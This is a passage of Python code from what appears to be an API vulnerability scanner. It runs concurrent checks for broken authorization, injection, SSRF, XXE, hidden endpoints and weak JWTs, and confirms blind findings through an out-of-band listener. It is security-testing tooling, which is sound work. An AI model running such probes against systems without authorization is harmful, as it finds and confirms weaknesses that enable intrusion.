        if vuln and vuln not in report["vulnerabilities"]:
            report["vulnerabilities"].append(vuln)
            log(f"     [!] Found: Insecure CORS Policy")

        vuln = check_open_ports(base_url)
        if vuln and vuln not in report["vulnerabilities"]:
            report["vulnerabilities"].append(vuln)
            log(f"     [!] Found: Exposed Infrastructure Ports")

        is_smart_fuzz = scan_options.get('smart_fuzz', True)
        if is_smart_fuzz:
            log("[*] Smart Fuzzing Enabled: Hunting for undocumented Shadow APIs...")

        # Pass existing vulnerabilities to allow deduplication of paths already found in 'debug' phase
        vulns, new_endpoints = find_hidden_api_endpoints(base_url, auth_headers, baseline, tech_stack, logger, is_smart_fuzz, existing_vulns=report["vulnerabilities"])
        for v in vulns:
            # Check if this specific vulnerability (path + name) is already in report
            is_dup = any(ov.get('path') == v.get('path') and ov.get('name') == v.get('name') for ov in report["vulnerabilities"])
            if not is_dup:
                report["vulnerabilities"].append(v)
                log(f"     [!] Recon Found: {v['name']} at {v.get('path', '')}")
        endpoints.extend(new_endpoints)

    if scan_options.get('jwt') and auth_headers and auth_headers.get('Authorization'):
        vuln = check_jwt_weakness(auth_headers.get('Authorization'))
        if vuln and vuln not in report["vulnerabilities"]:
            report["vulnerabilities"].append(vuln)
            log(f"     [!] Found: Weak JWT Config")
    
    # --- Turbo-Charged Concurrency Engine ---
    if len(endpoints) > 0:
        endpoints_scanned = 0
        total_endpoints = len(endpoints)
        global_pause = False
        endpoint_failures = {} # For Circuit Breaker

        def scan_endpoint_task(endpoint_string):
            nonlocal endpoints_scanned, global_pause, auth_headers, secondary_auth_headers
            
            # --- CHECK STOP SIGNAL ---
            if report_id:
                from .models import ScanReport
                if ScanReport.objects.get(id=report_id).status == "Stopped":
                    return
            
            if not endpoint_string or " " not in endpoint_string: return
            method, path = endpoint_string.split(" ", 1)
            method = method.lower()
            
            # FAST FAIL: Do not run active scans on known Unreachable nodes
            if "(Unreachable)" in path:
                log(f"  -> Skipping Active Scan for Unreachable Node: {path}")
                endpoints_scanned += 1
                return
            
            # Circuit Breaker
            if endpoint_failures.get(path, 0) >= 3:
                return
                
            # Anti-DDoS Global Pause
            while global_pause:
                time.sleep(1)

            try:
                log(f"  -> Scanning {method.upper()} {path} ...")

                vulns_found = []
                
                if scan_options.get('auth'):
                    log(f"    -> Running Auth checks...")
                    vuln = check_broken_authentication(method, path, base_url, auth_headers, logger)
                    if vuln: vulns_found.append(vuln)

                if scan_options.get('bola') and method == 'get' and auth_headers:
                    log(f"    -> Running BOLA checks...")
                    # 1. Single-token BOLA (Heuristic)
                    vuln = check_bola_vulnerability(method, path, base_url, auth_headers)
                    if vuln: vulns_found.append(vuln)
                    
                    # 2. Multi-tenant BOLA (Guaranteed Zero FP)
                    if secondary_auth_headers:
                        log(f"    -> Running Cross-User IDOR Matrix...")
                        vuln = check_cross_user_bola(method, path, base_url, auth_headers, secondary_auth_headers)
                        if vuln: vulns_found.append(vuln)

                if scan_options.get('injection'):
                    log(f"    -> Running Injection checks...")
                    vuln = check_injection(method, path, base_url, auth_headers, oast_url, tech_stack)
                    if vuln: vulns_found.append(vuln)

                if scan_options.get('ratelimit'):
                    log(f"    -> Running Rate Limit checks...")
                    vuln = check_rate_limit(method, path, base_url, auth_headers)
                    if vuln: vulns_found.append(vuln)

                if scan_options.get('ssrf', True):
                    log(f"    -> Running SSRF checks...")
                    vuln = check_ssrf(method, path, base_url, auth_headers, oast_url)
                    if vuln: vulns_found.append(vuln)

                if scan_options.get('sensitive_data', True):
                    log(f"    -> Running Sensitive Data checks...")
                    vuln = check_sensitive_data(method, path, base_url, auth_headers)
                    if vuln: vulns_found.append(vuln)

                if scan_options.get('hidden_params', True):
                    log(f"    -> Running Hidden Parameter checks...")
                    vuln = check_hidden_parameters(method, path, base_url, auth_headers)
                    if vuln: vulns_found.append(vuln)

                if scan_options.get('mass_assignment', True):
                    log(f"    -> Running Mass Assignment checks...")
                    vuln = check_mass_assignment(method, path, base_url, auth_headers)
                    if vuln: vulns_found.append(vuln)

                if scan_options.get('xxe', True):
                    log(f"    -> Running XXE checks...")
                    vuln = check_xxe(method, path, base_url, auth_headers, oast_url)
                    if vuln: vulns_found.append(vuln)

                if scan_options.get('unsafe_methods', True):
                    log(f"    -> Running Unsafe Methods checks...")
                    vuln = check_unsafe_methods(path, base_url)
                    if vuln: vulns_found.append(vuln)
                    
                if is_bfla_test and low_priv_headers and ('admin' in path.lower() or 'system' in path.lower() or 'private' in path.lower() or method in ['post', 'put', 'delete']):
                    try:
                        bfla_url = f"{base_url.rstrip('/')}{path if path.startswith('/') else '/' + path}"
                        bfla_res = GLOBAL_SESSION.request(method, bfla_url, headers=low_priv_headers, timeout=3)
                        if bfla_res.status_code in [200, 201, 202, 204]:
                            vulns_found.append({
                                "name": "Broken Function Level Authorization (BFLA)", 
                                "severity": "Critical", 
                                "description": f"Privilege Escalation Matrix detected BFLA. Low privilege user '{low_priv_user}' successfully executed {method.upper()} on High privilege endpoint {path} (Status: {bfla_res.status_code}). [Violates API5:2023]", 
                                "cvss": 9.0, 
                                "owasp": "API5:2023 Broken Function Level Authorization"
                            })
                            log(f"     [!] CRITICAL: BFLA Privilege Escalation Detected on {path}!")
                    except Exception:
                        pass
                        
                # Append found vulnerabilities safely
                with scan_lock:
                    for v in vulns_found:
                        if v not in report["vulnerabilities"]:
                            report["vulnerabilities"].append(v)
                            log(f"     [!] Found: {v['name']}")
                            
                    endpoints_scanned += 1
                    percent = int((endpoints_scanned / total_endpoints) * 100)
                    if endpoints_scanned % max(1, int(total_endpoints/10)) == 0 or endpoints_scanned == total_endpoints:
                        log(f"  [Progress] {endpoints_scanned}/{total_endpoints} Endpoints Scanned ({percent}%)")

            except requests.exceptions.RequestException:
                with scan_lock:
                    endpoint_failures[path] = endpoint_failures.get(path, 0) + 1
                    if endpoint_failures[path] >= 3:
                        log(f"  [!] Circuit Breaker: Endpoint {path} failed 3 times. Skipping.")
            except Exception as e:
                log(f"     [!] Error scanning {path}: {e}")

        # Execute using ThreadPoolExecutor
        log(f"[*] Launching Stealth Engine (5 Threads)...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(scan_endpoint_task, endpoints)
            
    else:
        log("[*] No endpoints to scan. Skipping endpoint-specific tests.")

    # Status reflects scan outcome, not the count of findings.
    # A scan that completed without errors is a "Completed" scan, whether
    # it found 100 vulns or 0. That's the only honest reading.
    report["status"] = "Completed"

    # --- OAST Verification ---
    if oast_token:
        log("[*] Checking OAST Listener for asynchronous callbacks...")
        time.sleep(2)  # Give slow servers a second to callback
        from .models import OASTEvent
        events = OASTEvent.objects.filter(token=oast_token)
        if events.exists():
            for e in events:
                log(f"     [!!!] BLIND VULNERABILITY CONFIRMED: Received ping from {e.source_ip}")
            report["vulnerabilities"].append({
                "name": "Out-of-Band (Blind) Vulnerability Confirmed",
                "severity": "Critical",
                "description": f"The API Sentinel OAST listener caught an out-of-band request matching token {oast_token}. This confirms a Blind SSRF or Blind Command Injection.",
                "cvss": 10.0,
                "owasp": "API10:2023 Unsafe Consumption of APIs"
            })

    # --- Verification Round (zero-FP gate) ---
    confidence_threshold = int((scan_options or {}).get('confidence_threshold', CONFIDENCE_THRESHOLD_DEFAULT))
    # Also tag any legacy OAST finding so it survives the threshold filter
    for v in report.get("vulnerabilities", []):
        if "confidence" not in v:
            v["confidence"] = Confidence.DEFINITIVE if v.get("name", "").startswith("Out-of-Band") else Confidence.LOW
    report = run_verification_round(report, base_url, auth_headers, confidence_threshold, logger=logger)

    report["endpoints"] = list(set(endpoints))
    report["findings_count"] = len(report.get("vulnerabilities", []))
    if report["findings_count"] == 0:
        log("[+] Scan Completed: 0 confirmed findings (target may be well-defended or has no API surface).")
    else:
        log(f"[+] Scan Completed: {report['findings_count']} confirmed finding(s).")

    return report

